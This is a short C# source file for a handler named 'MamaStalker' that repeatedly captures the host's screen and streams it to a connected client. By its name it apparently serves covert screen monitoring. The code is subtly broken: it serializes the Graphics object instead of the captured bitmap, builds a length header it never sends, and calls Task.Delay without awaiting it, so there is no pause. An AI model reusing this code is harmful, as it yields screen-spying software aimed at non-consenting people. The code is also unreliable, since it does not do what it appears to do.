using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using PingPongServer.Server.Abstract;
using Commons;
namespace MamaStalker
{
    public class MamaStalkerClientHandler : ClientHandlerBase
    {
        public Parser MyParser { get; set; }
        public int Interval { get; set; }
        public MamaStalkerClientHandler(IClientConnection clientConnection,int interval) : base(clientConnection)
        {
            Interval = interval;
            MyParser = new Parser();
        }

        public override Task Job()
        {
            while (true) 
            {
                Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics graphics = Graphics.FromImage(printscreen as Image);
                graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);
                byte[] bytes = MyParser.ObjectToByteArray(graphics);
                byte[] lengthHeader = MyParser.ObjectToByteArray(bytes.Length);
                MyClientConnection.Send(bytes);
                Task.Delay(Interval);
            }
        }
    }
}
